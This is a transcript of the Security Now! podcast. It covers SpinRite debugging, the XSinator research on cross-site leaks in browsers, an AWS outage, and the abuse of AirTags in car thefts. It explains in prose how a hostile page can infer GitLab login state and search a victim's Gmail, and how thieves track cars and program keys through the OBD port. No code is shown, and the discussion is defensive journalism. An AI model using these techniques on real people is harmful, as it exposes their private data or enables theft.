What's been so gratifying is that as testers have swung by the development group over the weekend, one after another they've reported that this or that trouble their systems used to have is now gone, and that SpinRite's latest development release is now working perfectly for them.  So we've seen a lot of progress.  But there are a few exceptions, and they're nasty.  A couple of people have reported that the size of the first drive in the list is being confused with the size of the last BIOS drive in their system.  It doesn't happen to me, nor to most people.  But it reliably happens to a couple of our testers.  So something different is going on in their systems.  One person has a 70TB Drobo directly attached to their system and is BIOS accessible, and that was crashing SpinRite because I wasn't ready for a 70TB  drive, which is overflowing some register space.  So I'll expand that.



LEO:  The other thing with Drobos is they're not always reporting the actual space.



STEVE:  Yes.  That's exactly what we saw.  He said he only had 32TB, but it's saying 70.



LEO:  Yeah, that's Drobos right there.



STEVE:  Yeah.  And a few others are reporting something really odd.  SpinRite's own division overflow pop-up is popping up.  Now, the pop-up tells us where the division overflow occurred.  But when I look there in SpinRite's code, there's no division instruction at that location.  So the only conclusion is that something is causing SpinRite's own code to be overwritten.  Fortunately, what's being overwritten contains either an F6 or an F7, which are the x86 division opcodes.



So I know where the first drive's size is stored, which something is changing later when it shouldn't.  And that errant division overflow pop-up tells us where a division instruction has mysteriously appeared in SpinRite's code.  So we need to track down what's going on with the drive size being changed and the code being overwritten.  To do that we need to catch the overwriting action in the act, as it's happening.  The problem is I've never been able to reproduce any of those problems myself.  It's only happening on a few distant machines.



The answer, which I will immediately implement a few hours from now, maybe in the morning, depending upon how I'm feeling after the podcast, is to build a native debugger directly into SpinRite.  And that's actually easier than it sounds.  The Intel x86 architecture has always incorporated built-in hardware debugging assistance.  It has four 32-bit breakpoint registers which can be set to point to any region of the system's memory.  Each of the four breakpoint registers can be set to interrupt the processor upon the execution, the reading, or the writing of that memory with a 1, 2, 4, or 8-byte span.  So this next test release of SpinRite will add a couple of new command line options to load and enable those debug registers.



Once a tester has seen where SpinRite reported an erroneous division instruction, they'll be able to immediately re-run it, setting a write breakpoint at that spot in SpinRite's code which will allow us to catch in the act whoever is overwriting SpinRite.  I'm assuming it's me with some errant code of mine.  It might be their BIOS.  Again, I can't make it happen.  They can make it happen, and this will allow anybody to work with me, essentially doing remote debugging of the code using the x86 debugging instructions.  So we're going to have an interesting time in the next week, and I'll probably report that SpinRite has got these problems solved by a week from now.



LEO:  That's amazing.  That's amazing.  Meanwhile, I'm still playing bingo with some squid on my submarine.



STEVE:  Or as Lorrie says, "I made the bed."



LEO:  I got something done today.  You know, that's good, that's good.  Steve, let's take a break.  Then we're going to get into the meat of the matter.



STEVE:  XSinator.



LEO:  Whatever you mean by XSinate.  We will find out in just a moment.  All right, Steve.  Let's talk about, what is it, signitficit?  What are you talking about?



STEVE:  I would assume we would pronounce it XSinator, X-S-I-N-A-T-O-R, XSinator.



LEO:  XSinator sounds right, yeah.



STEVE:  Okay.  Their paper is titled:  "XSinator.com:  From a Formal Model to the Automatic Evaluation of Cross-Site Leaks in Web Browsers."



LEO:  Oh, XS as in cross-site, okay, okay.



STEVE:  Exactly, cross-site.  It's the result of a comprehensive work conducted by a team of five German University researchers.  And as a result of their work they discovered 14 new types of cross-site data leakage which are effective against, well, I think every browser - Tor, Firefox, Chrome, Edge, Safari, Opera, and others, both desktop and mobile, as I said.  And going to XSinator.com allows you to run the test that they've designed which will profile your own browser, it shows up in the left-hand column, and then allow you to compare it against all the other browsers which had been profiled.



So they call the bugs "XS-Leaks," as in cross-site leaks, because they enable malicious websites to harvest the personal data from their visitors as they interact with other websites in the background, that is, as the hostile website you go to, or for that matter an ad that is running script, all that has to happen is script is run in your browser.  Then reach out using JavaScript using AJAX to create connections to other browsers with which you have a relationship.



In a recent statement about their research, which was presented during last month's 2021 ACM SIGSAC Conference on Computer and Communications Security, which by the way their presentation garnered a Best Paper Award, they explained.  They said:  "XS-Leaks bypass the so-called same-origin policy" - and whoops, we know how crucial that is in our browsers for browser security - "one of a browser's," they wrote, "main defenses against various types of attacks.  The purpose of the same-origin policy is to prevent information from being stolen from a trusted website.  In the case of XS-Leaks, attackers can nevertheless recognize individual small details of a website.  If these details are tied to personal data," they said, "those data can be leaked."



Now, our listeners probably know by now that I'm a sucker for formally proven security findings.  There's certainly a place for fuzzing, which is probably the other end of that spectrum from formal proofs.  And formal proofs won't help when modeling cannot be applied.  But whenever possible, creating a mathematically formal model of a system, then using that model to reach and/or demonstrate security conclusions, is in my mind the gold standard.



So here's how this team describes what they've accomplished.  In their abstract for their paper they said:  "A Cross-Site Leak describes a client-side bug that allows an attacker to collect side-channel information from a cross-origin HTTP resource."  They wrote:  "They pose a significant threat to Internet privacy, since simply visiting a web page may reveal if the victim is a drug addict or leak a sexual orientation.  Numerous different attack vectors, as well as mitigation strategies, have been proposed; but a clear and systematic understanding of XS-Leak root causes is still missing."  Or at least was before they began this.



They said:  "Recently, Sudhodanan et al. gave a first overview of a XS-Leak at the Network and Distributed System Security Symposium (NDSS)."  They said:  "We build on their work by presenting the first formal model for XS-Leaks.  Our comprehensive analysis of known XS-Leaks reveals that all of them fit into this new model.  With the help of this formal approach, we, one, systematically searched for new XS-Leak attack classes; two, implemented XSinator.com, a tool to automatically evaluate if a given web browser is vulnerable to XS-Leaks; and, three, systematically evaluated mitigations for XS-Leaks.  We found 14 new attack classes, evaluated the resilience of 56 different browser/OS combinations against a total of 34 XS-Leaks, and propose a completely novel methodology to mitigate XS-Leaks."



Now, in the show notes I have my own results using Firefox and Chrome, Firefox 94 on the left, Chrome on the right.  And red is bad.  There's a lot of red there, both Firefox and Chrome.  In their paper, and I did not include it in the show notes - I forgot - they have some other tables where they show all of the tests and all of the different browsers and version numbers.  And for what it's worth, Firefox has fewer reds than anything else.  The Tor browser, which of course is based on Firefox, has even a few fewer.  But, yeah, so Leo, now you have on the screen the - I guess that's the pre-test page.  And up at the top there you're able to click a blue button, which is like right there, and click it, and it will begin, it will initiate the test which is now underway on your browser.  So we'll see how that comes out.



LEO:  How long is this going to take?



STEVE:  It's only a few minutes.



LEO:  Okay.  I'll be back with you in a minute.



STEVE:  And I think that opened another tab.  Switch back to the first tab, and you might be able to see it operating, if it opened a second...



LEO:  It's running, yeah.



STEVE:  Oh, yeah, there it is.  And you're seeing - you're beginning to get some red.



LEO:  These are the initial results.  Okay, yeah.



STEVE:  Yup.  I think it's still in process.



LEO:  What are these things?  Is there something I should be worried about here?



STEVE:  Yeah.  That's why we're talking about this today.



LEO:  I'm in Firefox doing this.  Okay.



STEVE:  Yeah.  Okay.  So in a web application, they explain, a web browser interacts with several different web servers through HTTP or web-socket connections.  The client-side logic of the web application is written in HTML, CSS, and JavaScript, and is executed inside a tab of the browser, or inside an inline frame in another application, or an ad.  The execution context of a web application is defined through the concept of web origins.  Web applications may call and embed other web applications to enhance functionality.



For example, a hotel reservation site might embed Google Maps and public transportation sites as an easy method to allow its customers to determine how to reach the hotel.  In such situations, cross-origin HTTP requests between different web origins, meaning the hotel's origin and the Maps server origin, are necessary to retrieve data to embed and display in the web application.



When interacting with a website, a user has a well-defined state.  This state typically contains the information such as whether the user is logged into the site currently or not.  Besides the login status, the user state may contain account permissions such as admin privileges, premium membership, or restricted accounts.  The number of different user states is potentially unlimited.  For example, in a webmail application, a user may or may not have received an email with the subject "top secret."



Okay.  So they say, under Privacy Risks of Cross-Origin Requests:  "Consider the following situation.  The attacker has lured a victim to a malicious web application that executes hidden cross-origin HTTP requests to different drug counseling sites.  If the attacker could learn whether the victim has logged in at one of these drug counseling sites, the attacker could gain highly privacy-critical information about the victim.



"To distinguish between two user states, the attacker's JavaScript code must be able to identify differences in its own execution environment resulting from different responses to cross-origin HTTP requests.  These different responses must correspond to different user states at the target" - that's sort of the victim - "web application.  If this differentiation is possible, we call this vulnerability a cross-site leak.  The attacker can then craft a malicious website, which triggers the cross-site leak once the victim visits it."  Okay.  We'll get specific here in a second.



So then they give two real-world examples, an XS-Leak on GitLab.  They wrote:  "GitLab is a popular web application for collaborative software development hosted by many companies. GitLab provides a profile URL, which is https://git.company.com



/profile.  If the user is not logged in, this URL redirects the user to https://git.company.com/users/sign_in.  If the user is logged in, the current user's profile is shown.  However, since the attacker embeds GitLab cross-origin into the attacker's own web page, the attacker cannot directly read the URL.



"In Listing 1 above," and I've included it in the show notes, "we use the window.length property, which is readable cross-origin, to determine the user state at the other site.  The profile page does not contain any iframes, but the login page includes three iframes.  If this property, window.length, has the value 3, that means the user is not currently logged in.  If it has the value 0, the user is logged in.  By scanning different company websites hosting GitLab, the attacker can collect information on a programmer's affiliations."  So there's an example of true cross-origin information leakage where a site you visit or an ad hosted by a benign site is able to determine things about you and your current state with other domains, with other websites.



And it works on Google Mail.  They give an example of a cross-site leak on Google Mail.  They say:  "Google Mail, one of the most popular webmail applications.  In 2019, Terjanq (T-E-R-J-A-N-Q) reported a XS-Leak which could determine whether an email with a certain subject, for example drug counseling, or content was present in the user's inbox cross-origin."  In other words, it's possible to reach into a user's Gmail this way.



"The cross-site leak abused the common cache that web applications share.  By using the advanced search option, which can be called 'cross-origin,' Google Mail marks search results, if any exist, with a dedicated image.  To perform a cross-site leak attack, the attacker first empties the web cache, which can be done locally, then calls Google Mail advanced search using a URL, which can be done, and finally checks if the dedicated image is available in the cache.  If true, the search was successful, and the attacker learned that an email containing whatever search term the attacker queried currently exists in the target's, the victim's inbox."



Okay.  So let's make sure that everyone understands where we are.  Any Gmail user visits some random nosy website.  Without any indication of any kind, that nosy website running JavaScript on the user's web browser is able to use subtle and clever tricks to perform as many go/no-go searches of the user's Gmail inbox as they wish against the current content, entirely behind their backs and without their knowledge.



We've talked about this general class of web browser hacks a number of times in the past.  Broadly speaking, it is incredibly difficult to robustly prevent any cross-domain leakage.  We've seen that initially benign-seeming convenience features, such as changing the color of previously visited links, can compromise privacy when website A uses the user's browser to display website B offscreen and then probes website B's DOM, the Document Object Model, for the colors of various links.  In this way, information that is none of website A's business leaks from the user's previous use of website B.



What this team has done is further explore and rigorously map brand new forms of subtle side-channel cross-origin information leakage.  And they've come away with a surprisingly large number of new ways for clever attackers to leverage deliberate features of JavaScript, like using the window.length of some other website's page to infer information that's none of their business about the browser's owner.



We've seen that previous cross-domain cookie and cache attacks have led browser developers to segment all cookie storage by domain, and to similarly segment all browser cache by domain.  Since the performance impact of this is negligible, the great impact is upon browser complexity and maintenance, which have skyrocketed.  If you've looked at the number of processes today running when you launch your web browser, it's clearly a huge burden now on browser developers.  Like today's operating systems, web browsers are no longer something that can be casually assembled.



But the nature of the leakage these guys have uncovered and demonstrated is different from that because it leverages the non-gray area features of our browsers.  They're employing features that are there by design.  This suggests, in turn, that in the future our web browsers may choose to deliberately strip these side-channel features and limit JavaScript's interaction with cross-origin domains.  And that would probably be a good thing.  It's going to be tough because it's going to change some functionality.  But what we've seen is that the browser vendors are extremely conscious of this kind of cross-origin privacy leakage, and this paper just unveiled a huge new assortment of ways that can be done.



LEO:  Really interesting, yeah.



STEVE:  Yeah.



LEO:  So presumably Chrome, Firefox, the browser guys...



STEVE:  All of them.  All of them.



LEO:  ...will fix this; yes?  It's fixable; right?



STEVE:  Yes.  And that's the upside of this kind of research and this kind of testing site.  I mean, this will immediately subject the browser vendors to significant pressure, which, you know...



LEO:  They need.



STEVE:  This is not their fault, but they do need the pressure.



LEO:  They want to fix it.  Now Grayson Peddle in our Discord chat has a question which I think is germane.  If you're using a browser that sandboxes tabs, does that keep the cross-site scripting from happening?  They can't communicate with one another; right? 



STEVE:  I don't think tab sandboxing would work because in a tab the JavaScript is using HTTP queries and web sockets to bring another domain into it.



LEO:  Right.



STEVE:  So it's not having to talk across the tab.



LEO:  So it bypasses the tab.  It's in one tab.  It's in one process.



STEVE:  Exactly.  It's all happening on that, on the page the user is currently visiting.



LEO:  Apparently there's some sort of container method for Firefox.



STEVE:  Well, and Leo, the fact that we're seeing red when we click that button...



LEO:  Yeah, that tells you.



STEVE:  Those are effective, successful cross-domain probes that have just occurred.



LEO:  Right, right, right.  Okay.  So Grayson, is there a special version of Firefox that containerizes the various instances?  I don't even know if that'd help because it's all happening within one instance; right?



STEVE:  Yes.  It's on the current tab.  He's certainly referring to the tab isolation.



LEO:  Yeah, that's what I thought he was.  But, yeah, okay.



STEVE:  Yes.  And that's a great point.  But here it's script on the page is poking at other domains behind your back.  And so the problem is that those domains know about your browser.  So when JavaScript in your browser pokes at those domains, the cookies that you have, the other information that your browser has about those domains go along with those queries.  And so that's how those foreign domains respond differently to you.  It's because your browser via the JavaScript running on that page has asked them something, and their behavior subtly changes when it's you asking versus somebody else asking.



LEO:  So interesting.  That's good research.  Nicely done.



STEVE:  It's really well done.



LEO:  Yeah, yeah.  And of course so is this show, thanks to this guy right here, Mr. Steven "Tiberius" Gibson.  If you want to -  we have lots of ways to get this show.  Of course you can go right to Steve's site, GRC.com, and get 16Kb audio, as well as 64Kb audio, if you want to save on download bytes.  Also the transcripts, which he commissions from Elaine Farris, are really good and a great way to search any Security Now! episode.  You've got transcripts for all 848?  No.



STEVE:  Yeah, we went back and did them from the beginning.



LEO:  That's amazing.  Really makes this a very valuable resource.  GRC.com.  While you're there, pick up Steve's bread and butter, the one and only thing that makes him money, so buy a copy of SpinRite, the world's finest mass storage maintenance and recovery utility.  6.0 is the current version.  But as you can tell, he's working hard on 6.1.  You'll get to participate in the development and get a free upgrade if you buy today:  GRC.com.  Also lots of other stuff there.  It's a really...



STEVE:  Completely rewritten, and I didn't even change the  major version number of the darn thing.



LEO:  Yeah.  Yeah, why didn't you make it SpinRite 7?



STEVE:  Because I promised everybody a free upgrade.  So everyone's getting a free upgrade.



LEO:  Okay.  And you also made some promises about what 7 might mean.  Right?



STEVE:  Yeah.  7 will definitely go further, and it'll run on UEFI systems.



LEO:  That's the big difference, yeah.



STEVE:  And have, well, and also have native drivers for USB-attached devices and NVMe, which we're also seeing.



LEO:  And it'll basically open it up to Mac users, which is great.



STEVE:  Yeah.  



LEO:  Yeah.  So you'll get 6.1, but then it's time for 7.0.  And if Steve lives long enough, if I live long enough, we'll deliver that, as well, but not for free.  There you go.  Leave feedback at GRC.com/feedback.  You can also slide into his DMs, as the kids say, on Twitter.  He's @SGgrc, and his DMs are open.  So questions or comments can be left there, proposals for the Picture of the Week, that kind of thing.  Let's see, what else?



We have copies of the show on our website.  We have 64Kb audio also.  But we also have a unique format.  We have a video.  If you want to see Steve's mustache in action, you can go to TWiT.tv/sn.  You can also subscribe in your favorite podcast client, which is probably the best way.  That way you'll get it automatically.



The show we do live Tuesdays, right after MacBreak Weekly, 1:30 to 2:00 p.m. Pacific, let's make it 2:00 p.m., 5:00 p.m. Eastern time, 22:00 UTC.  If you want to watch or listen live, the stream is at live.twit.tv, the streams.  There are several of them.  People who are watching live are often in the Discord in our club or on our free IRC server, irc.twit.tv.  That's a community-run resource.  Thanks to all of our mods.  They're really amazing in there, starting with OzNed and ScooterX, and just a great bunch of people in there.  That's always a lot of fun.  And that's free and wide open.  You can use a browser or an IRC client:  irc.twit.tv.



We also have forums.  Steve's got forums.  We had to have them.  So we have Discourse forums - Discourse, not Discord - at twit.community.  We have a Mastodon instance at twit.social.  If you feel like tweeting in a nice group of people, twit.social.  We don't call it "tweeting" in Mastodon.  We call it "tooting."  So toot along.  Don't.  Don't.  I know what you're thinking.



STEVE:  Beans, beans, the wonderful - yeah.



LEO:  Yes.  That's exactly what I thought.  I forget to mention, and I want to mention this a little.  It's almost like a tech support note.  But we also offer ad-free versions of all of the shows as individual subscriptions through iTunes, through Apple's podcast client.  I think it's $2.99 per show.  So if you just want Security Now!, less than 3 bucks a month you get Security Now!.  But, and this is a - I think it's a bug in Apple's system.  Don't be too in much of a hurry to get it there because what happens, we upload the thing, and then there's some disconnect, but for a brief moment of time, I know, it might be like 30 seconds, if you're there right when we upload the show, you'll get the version with ads.



So a number of people have said, wait a minute, I pay 2.99.  There should be no ads.  Yeah, because of the way Apple does it, it doesn't switch over to the ad-free version right away.  There's a lag.  And we don't know why that is.  We've talked to Apple.  We hope they fix it.  But in the meanwhile don't be in a hurry if you pay for the ad-free version through podcasts, the Apple Podcast app.  Let Apple's Podcast get it.  And then I think that should work out all right.  Don't force it, in other words.



I think that's it.  I think we've done everything.  Steve, you're the best.  While you were talking I was able to find the bug in my Day 4 solution of Advent of Code.  Moving on.



STEVE:  Oh, cool.  Nice.



LEO:  Oh, I just transposed some lines, you know, it's one of those things.  I kept getting a weird error message.



STEVE:  I do.  I do.



LEO:  Yup.  Got to put the break higher up in the four fold.  What was I thinking?  So we'll see you next time, next Tuesday on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#849

DATE:		December 14, 2021

TITLE:		Log4j & Log4Shell 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-849.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we will, of course, be discussing what's being called the worst Internet-wide security catastrophe in recent memory.  Log4Shell is not like Spectre or Meltdown, which were academic theories.  This is at the far other end of that spectrum.  But first we're going to talk a bit about last week's massive Amazon network services outage and the unfortunate but probably inevitable abuse of Apple's AirTag ecosystem.  I need to correct the record over my undeserved praise last week for Windows 11 and its loosening grip over its Edge browser association, and we need to warn all WordPress site admins about a new and serious set of threats.  We have a single item of closing-the-loop feedback about today's main topic, a bit of sci-fi and a SpinRite update.  Then we'll roll up our sleeves and, by the end of today's episode listening, will understand exactly how, why, and what happened with Log4j and Log4Shell.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Yes, of course we're going to cover what some are calling the worst security problem in 10 years.  Steve says it might even be worse than that.  Log4Shell coming up.  Also Steve takes back his praise for Microsoft.  I knew that wasn't going to last.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 849, recorded Tuesday, December 14th, 2021:  Log4j and Log4Shell.



It's time for Security Now!.  This is the show you've been waiting for ever since we found out on Thursday that the entire Internet was going down.  Here he is, my friends, Steve Gibson, the man of the hour, our friend @SGgrc.  Hello, Steve.



STEVE GIBSON:  Thank god we were able to stretch a taut string between your location and mine. 



LEO:  Otherwise no Internet, yeah.



STEVE:  No.



LEO:  This is, some are saying, the worst exploit in a decade.  It's hard to imagine anything worse, to be honest.



STEVE:  I'm seeing that a lot, and I think that probably understates it.  The good news is that our response to this is probably far better than it would have been a decade ago.  And that, I think, has made a huge difference.  I mean, we've been seeing a series of problems.  And even the nosebleed execs up in the C Suite, they're getting the idea that, okay, ransomware, that's bad; right?  I mean, yeah, they get it.  And so I do get the sense that the industry has jumped on this a lot more quickly than they would have 10 years ago.  But also there's a lot more to go wrong than there was 10 years ago.



LEO:  Who would have thought ransomware would have been a dress rehearsal for Log4j?  You know?



STEVE:  Yeah.  Yeah.  And so there's a whole bunch of fun things to talk about.  But among the things is that this is not a bug, this is a feature.  And one of the things that we've seen before, we saw this a lot kind of this year and last year with Microsoft, where some of their biggest problems were the results of features, which someone suddenly went, hey, you know, we can exploit that puppy.  And so you're sort of in a different level of poop.



LEO:  So to speak.



STEVE:  When things are working the way they're supposed to, and it's really bad.  So this is, and I've been waiting all year to say, the penultimate live episode...



LEO:  Woohoo!



STEVE:  ...of 2021.  We've got one more next week where I'm sure we'll be kind of doing some more cleanup on this topic, 849 for  December 14th.  And I titled it Log4j and Log4Shell since Log4j is the feature, and Log4Shell is the name that's been given, although I saw Logjam once, but that doesn't seem to be widespread.  I'm seeing Log4Shell is what the exploit is called.



LEO:  Log4j's the tool; Log4Shell's the exploit.



STEVE:  Correct.



LEO:  And it's just bad all around.



STEVE:  Oh, boy.  So we do have some other things to talk about.  Log4Shell, you know, as I already said, is not like Spectre or Meltdown, which were academic theories.  This is the far other end of the spectrum.  And I heard you on MacBreak Weekly talking about how maybe even Apple's iCloud was vulnerable.



LEO:  Yes.



STEVE:  We have some screen shots of it and its problems.  So, yeah.  But we're going to talk a little bit about last week's massive Amazon network services outage, and sort of the problem that we're seeing developing around networks which lose their resilience, which is what seems to be what happened last week.



We also have the unfortunate but probably inevitable abuse of Apple's AirTag ecosystem and some what-to-dos about that.  I also need to correct the record about my sadly undeserved praise last week for Windows 11 and its loosening grip over its Edge browser association, which turns out not to have been correct.  And we need to warn all WordPress site admins about a new and serious set of threats.



I've got a single piece of closing-the-loop feedback which is about essentially, well, it's about today's topic; a brief touch on some sci-fi; an update on SpinRite; and then we're going to roll up our sleeves.  And by the end of today's episode, everybody listening will understand exactly how, why, and what happened with Log4j and this Log4Shell nightmare that the industry is literally scrambling to remediate.



LEO:  I'm sorry, I was just updating my Minecraft server.  So I'll be with you in a moment.



STEVE:  And you know that's where it began?



LEO:  I know.  That's where it was discovered.  Now, I'm running NGINX.  So I'm probably not using Log4j.  That's for Apache, I think; right?



STEVE:  Well, Apache is the maintainer of the library.



LEO:  Oh, but other things could be using it.  I see.



STEVE:  Yes, yes, yes.  Basically any Java infrastructure probably has it, which of course is Minecraft.



LEO:  Minecraft, yeah.



STEVE:  And, like, whoa, so many other things.  Apache even has, I mean, logging is such an issue, they have a subdomain, logging.apache.org.  And the first thing you see in the upper left-hand corner when you go there is [fanfare] Log4j, you know, which is the de facto logging solution.



LEO:  Yeah, yeah.



STEVE:  Oh, but Leo, wait - well, well, we will get to the details.



LEO:  We'll get to it.



STEVE:  And we have a great holiday Picture of the Week, as well.



LEO:  I can't wait.



STEVE:  So, you know, the color of Cisco's network equipment has always been dark green.  They're sort of a Cisco green.  And it occurred to some enterprising, probably literally enterprising, individual that this holiday season they could stack those suckers up.  And they come in various sizes.  So if you used diminishing sizes as you went upwards, you'd get sort of a conical structure, reminiscent of a Christmas tree.



LEO:  Put the six-port switches at the top, and put your 48s, the 128s at the bottom, you've got a kind of a...



STEVE:  I think maybe a WiFi antenna of some sort there on the top to be the...



LEO:  Wire up the ports, yeah.  Oh, yeah.



STEVE:  Yeah, yeah.  And you get something very festive.  And you want to string a few CDs through the cords.  We've got a basketball and a big pill and a little box and - anyway, this was the...



LEO:  Merry Christmas.  Merry Christmas.



STEVE:  ..."How Geeks Do Christmas" for our Picture of the Week. 



LEO:  That's hysterical.  So tall we had to put it in sideways to fit it into the [crosstalk] notes.



STEVE:  That's right.  For the first time ever, the description of the podcast is running down the margin because the tree was so vertical.



So what happened last week with Amazon?  It sounds like the sort of routing error we've seen before, but I don't think that was it.  Based on some, you know, they were never very clear about this.  But the links over which our traffic is flowing are today so busy that, if anything happens to misdirect and unbalance the overall traffic flows, things can grind to a halt.



One of the coolest design features of both Ethernet and IP is the autonomous way both traffic layers handle packet collisions and dropped or lost packets.  But one of the downsides of this autonomous approach is that both layers require a certain minimum amount of headroom to operate.  And they begin to fail rather spectacularly as their links become congested.



Last Tuesday morning Amazon posted at around 7:30 in the morning Pacific time, here on the West Coast, they said:  "An automated activity to scale capacity of one of the AWS services hosted in the main AWS network triggered an unexpected behavior" - I bet it was - "unexpected behavior from a large number of clients inside the internal network."  Again, that's like, you know, about as gray as it could be, but okay.  They're saying something.



They said:  "This resulted in a large surge of connection activity that overwhelmed the networking devices between the internal network and the main AWS network, resulting in delays for communication between these networks.  These delays increased latency and errors for services communicating between these networks" - right, as would happen - they said, "resulting in even more connection attempts and retries.  This led to persistent congestion and performance issues on the devices connecting the two networks."



So as I noted, there can be a sort of cascade failure, like sort of an internal DDoS, where a large and highly complex network's persistent attempts to push traffic through can create self-perpetuating congestion.  Like once it gets bad, it can't back off.  It just doesn't know how.  And so it sounds as though something like that happened.  This went on for about four hours, after which the scope of the resulting outage became quite sobering as it took down a very long list of high-profile sites and online services, including many that had no - didn't even have any idea that they were dependent upon AWS because it's like, you know, like subsidiary services that they depended upon were using AWS.  And when that went off, so did their subsidiaries, and that brought them down, sort of in a dominos effect.



Ring, Netflix, Amazon's Prime Video, and Roku all disappeared on the East Coast.  Amazon's package delivery personnel began posting online that they could no longer access the internal apps they needed to scan packages, access delivery routes, and see upcoming schedules.  Colleges had to postpone online final exams because the exam servers were down.  Roomba vacuum cleaners refused to do their work.  Internet-dependent cat litter boxes and food dispensers wouldn't operate.  You know, it's like end times.



LEO:  The Wall Street Journal had the funniest article.  That's where that cat litter and kibble feeders came from.  They had the saddest-looking people.  We talked about it as a kind of a super First World problem.  Who's going to feed my cats?  Amazon's down.  You know what else went down, though?  Amazon's status page was based on AWS so no one could tell that Amazon was down.



STEVE:  Yes.



LEO:  Nice.



STEVE:  Who's going to scoop the poop?



LEO:  Who's going to scoop the poop?



STEVE:  That's right.



LEO:  Not me, surely.



STEVE:  As we know, Amazon has suffered similar problems in the past.  And other major web services and infrastructure companies have been hit by significant outages just this year.  Fastly  experienced an outage in June that took down major websites including Amazon, The New York Times, and Hulu.  And as we know, two months ago all of Facebook's services suffered their worst outage since 2008 over what turned out to be a configuration issue.



Okay.  So in any event, like it or not, what seems to be happening is that more and more of our lives are becoming dependent upon complex and tightly interconnected networks and their relationships.  As usage grows, what was initially ample overcapacity tends to be eliminated in the interest of economy.  Everything continues working, but the network gradually grows increasingly susceptible, well, like brittle, to systemic shock.  And many of those of us in the U.S. know we're currently living through a real-world example of exactly this, where our physical goods supply chain had quietly removed all of its slack in the name of just-in-time delivery efficiency.  But when the COVID outbreak caused consumer demand to first slack off and then to come roaring back, we learned that the system wasn't set up to handle such rapid changes in network congestion.



So last Tuesday, by mid-afternoon, Amazon had everything sorted out.  But this should remind us that there's a tradeoff being made which for the most part makes sense.  Huge economies of scale can be obtained by sharing pooled resources.  We've talked before, but that's sort of like the Cloudflare win, right, is that by pooling many organizations' resources behind a system that has overcapacity, any one of them can be protected.  They couldn't all be protected at once because they're depending upon the sharing of the pool.  Of course the downside is that very large single points of failure are created where none existed before.



We used to, in the early days of the Internet, right, we weren't talking about, oh, my god, something happened with one company, and who knew how many things were dependent upon it.  We were all bragging in the beginning that the Internet was - the whole point of its design was its incredibly high level of tolerance for outages and failures.  Things would automatically route around problems.  Well, yeah.  That was a nice idea.  And we've enterprise-ized the Internet.  And in enterprise-izing the Internet, we've said, oh, we don't need all that redundancy.  We don't need, you know, yeah, that's all expensive.  We don't want that.  We're going to put everything in one place, and the Internet's going to get everybody to it.  Unless that becomes a crater.  And then you've got a problem.  So anyway, that's what happened on Tuesday with Amazon.



I guess rather than "No good deed goes unpunished," I suppose this would be "No cool technology is immune from abuse," or perhaps we would call this "Why we can't have nice things."  It turns out that Apple's AirTags, those cool little tracking dongles, are now being abused, well, by miscreants, in one instance by car thieves who have figured out that they can "tag" a valuable car which they spot in a parking lot and later use the AirTag to locate the car wherever it went.



Okay.  So back in April, when Apple began shipping this technology, they were all happy about it.  They explained:  "Apple today introduced AirTag, a small and elegantly designed accessory that helps keep track of and find the items that matter most with Apple's Find My app," you know, "Find My" being the name of the app.  "Whether attached to a handbag, keys, backpack, or other items" - or they didn't mention cars - "AirTag taps into the vast, global Find My network and can help locate a lost item, all while keeping location data private and anonymous with end-to-end encryption."  That's right.  You won't be able to catch the bad guys because it's encrypted.  "AirTag can be purchased in one and four packs for just $29 and $99 for four, respectively, and will be available beginning Friday, April 30," they said back then.



In fact, their VP of Worldwide iPhone Product Marketing said:  "We're excited to bring this incredible new capability to iPhone users with the introduction of AirTag, leveraging the vast Find My network to help them keep track of and find the important items in their lives.  With its design, unparalleled finding experience" - I guess that's what you want from Apple is an unparalleled finding experience - "and built-in privacy and security features, AirTag will provide customers with another way to leverage the power of the Apple ecosystem and enhance the versatility of iPhone."  And of course iPad as well.



Okay.  Unfortunately, this also brings military or CIA-level object trackability to bad guys, as well as to our forgetful moms.  Apple explains:  "If AirTag is separated from its owner and out of Bluetooth range, the Find My network can help track it down.  The Find My network is approaching a billion Apple devices and can detect Bluetooth signals from a lost AirTag and relay the location back to its owner, all in the background, anonymously and privately."  Which is a feature that the car thieves really appreciate.



So unfortunately, Canadian Police in the York Region of Canada say they've discovered a new way in which thieves are using this friendly consumer technology to track and eventually steal high-end cars in the area.  Thursday before last, investigators said they have identified at least five incidents since September where suspects placed Apple AirTags in "out-of-sight" areas of the vehicles when they were parked in public spaces like mall parking lots.



And in fact in one of the pictures there was like the back of some big towing-capable thing.  You know how you have plugs that you plug into the back to extend the brake lights and things when you're towing something.  Well, those plugs had nice rubber protective covers.  And they stuck an AirTag in there and closed the little rubber protective cover.  So that's good because it's rubber, so radio can get out, and the vehicle can be tracked.



So these thieves, after hiding the tokens, used the AirTags to locate the vehicle at the victim's residence.  After the vehicle is located, police said the thieves gain entry through the passenger or driver-side door.  And once inside, the vehicle's OBD, remember that we talked about that, the On-Board Diagnostics port, is used to program the vehicle to accept a key that the suspects have brought with them and can then start the car and happily drive it off.



So what can be done?  Okay.  For one thing, be very suspicious if you own an iPhone or iPad and happen to receive a notification of a nearby AirTag, like that's not yours.  You know, your phone and Pads are synchronized with the ones you own.  So they expect to be able to pick up the AirTags that are encoded as being yours.  But be suspicious if you have an AirTag that is not yours.  And your phone will notify you of that.  Apple for their part is aware of the danger of this abuse.  AirTags will emit a sound when they're in the presence of a non-owner for some period of time.  And in response to this problem, in June Apple shortened this duration from three days to a few hours, mainly to deter the abuse of these dongles being used for tracking other people and objects.



The problem, of course, is that not everyone is part of the Apple ecosystem.  Many people are carrying Android devices.  The Android ecosystem has already responded strongly to the need for unknown AirTag scanning.  A search for "AirTag" on the Google Play store turns up a great many nice-looking apps.  And I suppose that because Apple maybe felt some sense of responsibility for having put their own reputation behind AirTags, they too just yesterday released their own AirTag Tracker Detection app for Android called "Tracker Detect."



